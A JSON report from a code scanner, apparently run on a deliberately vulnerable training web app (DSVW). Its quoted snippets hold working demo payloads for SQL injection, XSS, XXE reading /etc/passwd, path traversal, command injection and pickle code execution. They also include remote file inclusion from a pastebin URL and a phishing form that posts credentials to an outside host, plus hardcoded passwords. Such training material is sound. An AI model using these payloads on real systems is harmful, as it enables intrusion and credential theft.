[{"findings":[{"id": "d21a53da928c", "fix": {"template": null, "available": false}, "title": "Print statement found - consider using logging", "ruleId": "rules.py-print-statement", "snippet": {"code": "    print(\"[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\\n\" % (\"apt-get install python-lxml\" if os.name != \"nt\" else \"https://pypi.python.org/pypi/lxml\"))", "highlightLines": [6]}, "category": "code", "location": {"file": "dsvw.py", "line": 6, "column": 5}, "severity": "info", "references": [], "description": ""}, {"id": "d66f2856652d", "fix": {"template": null, "available": false}, "title": "HTTPS endpoint - consider adding Strict-Transport-Security header", "ruleId": "rules.py-missing-hsts", "snippet": {"code": "    print(\"[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\\n\" % (\"apt-get install python-lxml\" if os.name != \"nt\" else \"https://pypi.python.org/pypi/lxml\"))", "highlightLines": [6]}, "category": "code", "location": {"file": "dsvw.py", "line": 6, "column": 162}, "severity": "info", "references": [], "description": ""}, {"id": "59254f9ad1b4", "fix": {"template": null, "available": false}, "title": "HTTPS endpoint - consider adding Strict-Transport-Security header", "ruleId": "rules.py-missing-hsts", "snippet": {"code": "NAME, VERSION, GITHUB, AUTHOR, LICENSE = \"Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)\", \"0.4\", \"https://github.com/stamparm/DSVW\", \"Miroslav Stampar (@stamparm)\", \"Unlicense (public domain)\"", "highlightLines": [8]}, "category": "code", "location": {"file": "dsvw.py", "line": 8, "column": 112}, "severity": "info", "references": [], "description": ""}, {"id": "304cd1e9b8d9", "fix": {"template": null, "available": false}, "title": "Regex search - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-search", "snippet": {"code": "HTML_PREFIX, HTML_POSTFIX = \"<!DOCTYPE html>\\n<html>\\n<head>\\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\\n<title>%s</title>\\n</head>\\n<body style='font: 12px monospace'>\\n<script>function process(data) {alert(\\\"Surname(s) from JSON results: \\\" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\\\"position: absolute; top: 5px; right: 5px;\\\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\\n\" % html.escape(NAME), \"<div style=\\\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\\\">Powered by <a href=\\\"%s\\\" style=\\\"font-weight: bold; text-decoration: none; visited: blue; color: blue\\\" target=\\\"_blank\\\">%s</a> (v<b>%s</b>)</div>\\n</body>\\n</html>\" % (GITHUB, re.search(r\"\\(([^)]+)\", NAME).group(1), VERSION)", "highlightLines": [10]}, "category": "code", "location": {"file": "dsvw.py", "line": 10, "column": 1214}, "severity": "info", "references": [], "description": ""}, {"id": "eb12bb087530", "fix": {"template": null, "available": false}, "title": "Default admin credentials pattern - ensure these are not used in production (CWE-798)", "ruleId": "rules.py-default-admin-creds", "snippet": {"code": "USERS_XML = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?><users><user id=\"0\"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id=\"1\"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id=\"2\"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id=\"3\"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>\"\"\"", "highlightLines": [11]}, "category": "code", "location": {"file": "dsvw.py", "line": 11, "column": 84}, "severity": "medium", "references": [], "description": ""}, {"id": "72c92c40512c", "fix": {"template": null, "available": false}, "title": "Default admin credentials pattern - ensure these are not used in production (CWE-798)", "ruleId": "rules.py-default-admin-creds", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 137}, "severity": "medium", "references": [], "description": ""}, {"id": "729c94d1f4df", "fix": {"template": null, "available": false}, "title": "HTTPS endpoint - consider adding Strict-Transport-Security header", "ruleId": "rules.py-missing-hsts", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 319}, "severity": "info", "references": [], "description": ""}, {"id": "34aab0a4d0a2", "fix": {"template": null, "available": false}, "title": "Security header explicitly disabled - this weakens client protection", "ruleId": "rules.py-disabled-security-header", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", 